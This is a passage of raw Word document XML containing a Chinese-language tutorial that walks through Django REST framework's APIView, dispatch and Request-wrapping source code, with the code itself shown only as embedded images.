      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django-rest-framework源码分析</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2827C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:left="714" w:firstLineChars="0" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>一、A</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>PIV</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>iew入口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3637E47F" w14:textId="3294B673" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　在路由层执行as_view()方法</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>rest-framework/views.py/class APIView/def as_view()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1945B71A"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20BA974F" wp14:editId="314B7DC1">
            <wp:extent cx="7445828" cy="2577465"/>
            <wp:effectExtent l="0" t="0" r="3175" b="0"/>
            <wp:docPr id="15" name="图片 1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82985" cy="2590327"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="228E278E" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　可以看到，APIView继承了Django原生的View，并且重写了as_view()方法，在APIView的as_view方法中，除了一处类中是否有queryset属性的判定，as_view主要实现的功能是将原来返回的函数对象view加入装饰器装饰，使之可以被csrfmiddleware中间件的校验忽略，因为我们无法从前端获取csrf_token。如果不采用这种方法，我们不得不禁用该中间件，这就影响了我们继续正常使用Django原生框架。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42903486" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　django/views/base.py/class View/def as_view()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313BCC87"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3824169A" wp14:editId="5B83E258">
            <wp:extent cx="7704455" cy="3055620"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16" name="图片 1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50617" cy="3073928"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E221455" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">　　在Django原生的View类的as_view方法中，返回的函数对象view是一个闭包函数，该函数被装饰器csrf_exempt装饰后返回到路由层，在路由层被执行，在执行view时，view返回的是dispatch方法执行的结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C72F10C" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　在APIView类中重写了dispatch方法，所以上图红框内执行的是APIView的dispatch方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40962FFA" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　rest-framework/views.py/class APIView/def dispatch()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBB62C2"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6D8F1FFC" wp14:editId="26CAF478">
            <wp:extent cx="8878441" cy="2995749"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="17" name="图片 17">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49681" cy="3019787"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC89D9F" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　rest-framework/views.py/class APIView/def initialize_request()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A539AE0"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5311650D" wp14:editId="5D5E8C2C">
            <wp:extent cx="8878168" cy="2272937"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18" name="图片 18">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19798" cy="2309196"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="74697377" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">　　该方法返回了一个Request对象，Request类是一个restframework对Django原生的request进行封装的类，它保留了原生的request对象，作为新实例化request对象的_request属性，并且拥有原生的request对象的所有属性和方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7F923F" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　rest-framework/views.py/class APIView/def dispatch()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151A31AA"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0F3455C5" wp14:editId="65CB1B9D">
            <wp:extent cx="8802145" cy="2705100"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19" name="图片 1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43208" cy="2717720"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EFF1C5" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　回到dispatch方法，这里的if判断利用了反射，将我们自己写的get,post等方法取出，且让变量handle指向该方法。self.http_mehtod_names是一个列表，其中包含HTTP八个请求名称的字符串（['get', 'post', 'put', 'patch', 'delete', 'head', 'options', 'trace']）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181AD016" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　rest-framework/views.py/class APIView/def finalize_response()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AD9456"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3BEF46F4" wp14:editId="6581CE36">
            <wp:extent cx="9114296" cy="2689860"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20" name="图片 2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36372" cy="2696375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="392097DC" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">　　我们看到，在finalize_response函数中，传入了response参数，并且对其进行了一些封装，加入了属性，以及用断言进行校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326EACFD" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　response是handle调用后返回的结果，handle则是我们自己写的对应HTTP请求的方法，我们在方法中最后返回了一个HttpResponse对象。在dispatch方法中，主要是用反射，对HTTP请求的类型进行对应方法的分发。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEF261F" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:left="714" w:firstLineChars="0" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>二、Request类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239666A7"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rest-framework/request.py/class Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BECE404"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3FD0EA13" wp14:editId="4CB0A96D">
            <wp:extent cx="9394825" cy="3528060"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="21" name="图片 21">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34796" cy="3543070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F45501" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150" w:line="3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可以看到，</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对象被作为参数传入，封装进了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>restframework Request</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>类实例化对象的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_request</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性中，在实例化时，还给新的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对象加入了新的属性和方法。其中</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Empty</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>是一个用来占位的空白类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6DE241" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150" w:line="3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当我们想执行</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对象的方法或者想要获取原生</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对象的属性时，在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>class Request</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>中重写了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>__getattr__(self,attr)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法，该魔法方法在对象获取属性时，当该对象找不到属性时执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8D97C1" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150" w:line="30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rest-framework/request.py/class Request/def __getattr()__</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22038D2C"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3060A23A" wp14:editId="063C4691">
            <wp:extent cx="7567748" cy="1515110"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="22" name="图片 2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77438" cy="1517050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4BA473" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">　　当新</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对象的属性或者方法不存在时，在原生的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对象中寻找，如果也不存在，会抛一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>AttributeError</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>异常，这里做了异常捕获后，交给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>__getattribute__()</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>去执行。在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>中没有重写</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>__getattribute__()</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法，当属性不存在时，重写的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>__getattr__</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>截获了属性查找，如果</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_request</w:t>
